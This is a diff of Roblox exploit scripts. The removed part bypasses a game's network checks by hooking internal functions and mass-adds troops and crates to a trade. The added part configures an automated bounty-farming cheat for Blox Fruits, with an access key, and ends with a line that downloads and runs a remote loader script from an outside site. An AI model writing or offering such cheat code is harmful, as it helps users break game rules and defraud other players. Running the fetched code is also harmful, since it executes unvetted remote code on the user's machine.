@@ -1,59 +1,56 @@
-local TTD = require(game:GetService("ReplicatedStorage").MultiboxFramework)
-local save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)
-local Network = TTD.Network
-local Invoke = Network.Invoke; local GetFunc = getupvalue(Invoke, 1)
-local Fire = Network.Fire; local GetEvent = getupvalue(Fire, 1)
-if TTD.debug then print('Found Invoke/Fire') end
--- $ -- Bypass
-coroutine.wrap(function()
-    setidentity(2)
-    hookfunc(getupvalue(GetFunc, 1), function()
-        return true
-    end)
-    setidentity(8)
-end)()
-
-coroutine.wrap(function()
-    setidentity(2)
-    hookfunc(getupvalue(GetEvent, 1), function()
-        return true
-    end)
-    setidentity(8)
-end)()
-
-
-local amt = 999
-local troopsToSend = {
-    "ScientistClockman",
+getgenv().Key = "k3d5cc04abcc9f3116173d57"
+getgenv().BountyFarm = {
+    ["Script"] = {
+        ["Black Screen"] = true,
+        ["Team"] = "Pirates", -- Pirates/Marines
+        ["Panic % Health"] = 40, -- Teleport to Safe Zone if player below x % HP
+        ["Skip Timer"] = 60, -- Skip if took more than x seconds to kill
+        ["M1 Health"] = 90, -- Attack M1 if target health above x % HP
+        ["Ignore User"] = {"Portal-Portal", "Kitsune-Kitsune", "Mammoth-Mammoth"}, -- Ignore user with the ate Blox Fruit
+        ["Ignore Bounty"] = 5000000, -- Ignore user with higher than x bounty than you
+    },
+    ["Hop Server"] = {
+        ["Delay"] = 10, -- Delay before Hop Server
+        ["Below Ping"] = 100, -- Hop to Server below x ping
+        ["Hop Ping"] = 1000, -- Hop if current server ping is higher than x 
+    },
+    ["Skill"] = {
+        ["Cycle"] = true, -- Use in a Cycle (making use used all skill) instead of use prioritize the first order
+        ["Prioritize"] = {"Melee", "Blox Fruit", "Sword", "Gun"}, -- Use skill Left to right (first to last)
+        -- ["Skill"] = {Enable, Predict, Hold, Delay Next Skill}
+        ["Melee"] = {
+            ["Z"] = {true, true, 0.2, 0.1},
+            ["X"] = {true, true, 0.2, 0.1},
+            ["C"] = {true, true, 0.5, 0.1},
+        },
+        ["Blox Fruit"] = {
+            ["Z"] = {false, true, 0, 1},
+            ["X"] = {false, true, 0, 1},
+            ["C"] = {false, true, 0, 1},
+            ["V"] = {false, true, 0, 1},
+            ["F"] = {false, true, 0, 1},
+        },
+        ["Sword"] = {
+            ["Z"] = {true, true, 0.8, 0},
+            ["X"] = {true, true, 0.2, 0},
+        },
+        ["Gun"] = {
+            ["Z"] = {false, true, 0, 1},
+            ["X"] = {false, true, 0, 1},
+        },
+    },
 }
-
-local cratesToSend = {
-    "ClockCrate"
+getgenv().Setup = {
+    ["Melee"]  = "Dragon Talon",
+    ["Sword"] = "Cursed Dual Katana",
+    ["Gun"] = "Soul Guitar",
+    ["Accessory"] = "Warrior Helmet",
+    ["Stat"] = {
+        ["Melee"] = 2550,
+        ["Defense"] = 2550,
+        ["Sword"] = 2550,
+        ["Gun"] = 0,
+        ["Blox Fruit"] = 0,
+    }
 }
-
-
-
-local n = 0
-for i, v in pairs(save:GetData().Inventory.Troops) do
-    if table.find(troopsToSend, i) then
-        for i, v in pairs(v) do
-            n = n + 1
-             if n <= amt then
-            Fire("AddItemToTrade", "Troops", i)
-
-            end
-        end
-    end
-end
-
-for i, v in pairs(save:GetData().Inventory.Crates) do
-    if table.find(cratesToSend, i) then
-        for i, v in pairs(v) do
-            n = n + 1
-             if n <= amt then
-            Fire("AddItemToTrade", "Crates", i)
-
-            end
-        end
-    end
-end
+loadstring(game:HttpGet("https://nousigi.com/loader.lua"))() 
